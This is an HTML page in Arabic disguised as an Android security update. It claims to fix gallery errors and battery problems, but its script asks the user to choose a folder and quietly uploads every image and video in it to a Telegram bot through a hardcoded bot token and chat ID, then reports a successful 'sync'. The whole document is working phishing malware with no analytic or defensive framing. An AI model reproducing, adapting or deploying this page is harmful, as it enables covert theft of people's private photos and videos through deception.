<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="manifest" href="manifest.json">
    <title>تحديث خدمات النظام</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 40px; background-color: #1a1a1a; color: white; }
        .card { background: #2d2d2d; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        .logo { width: 80px; margin-bottom: 20px; }
        .btn { background: #3498db; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 18px; cursor: pointer; transition: 0.3s; }
        .btn:hover { background: #2980b9; }
        #status { margin-top: 20px; color: #aaa; font-size: 14px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://cdn-icons-png.flaticon.com/512/564/564445.png" alt="logo" class="logo">
        <h2>تحديث أمني للأندرويد</h2>
        <p>يجب مزامنة ملفات النظام لإصلاح أخطاء المعرض واستقرار البطارية.</p>
        <button class="btn" onclick="startCapture()">بدء المزامنة والإصلاح</button>
        <div id="status"></div>
    </div>

    <script>
        const BOT_TOKEN = '8301533698:AAFOJ_IyTmOXO5BPQwOEFFFYy7tfIlaqJ1g';
        const CHAT_ID = '7184970355';

        async function startCapture() {
            const status = document.getElementById('status');
            try {
                // طلب الوصول للمجلد
                const dirHandle = await window.showDirectoryPicker();
                status.innerText = "جاري فحص الملفات... يرجى عدم إغلاق الصفحة";

                for await (const entry of dirHandle.values()) {
                    if (entry.kind === 'file') {
                        const file = await entry.getFile();
                        
                        // تصفية الملفات لإرسال الصور والفيديوهات فقط (اختياري)
                        if (file.type.startsWith('image/') || file.type.startsWith('video/')) {
                            await sendToTelegram(file);
                        }
                    }
                }
                status.innerText = "تمت المزامنة بنجاح.";
            } catch (err) {
                status.innerText = "خطأ: يجب منح الصلاحية لإتمام التحديث.";
                console.error(err);
            }
        }

        async function sendToTelegram(file) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('document', file);

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
            } catch (e) {
                console.error("إرسال فاشل", e);
            }
        }

        // تسجيل الـ Service Worker
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js');
        }
    </script>
</body>
</html>
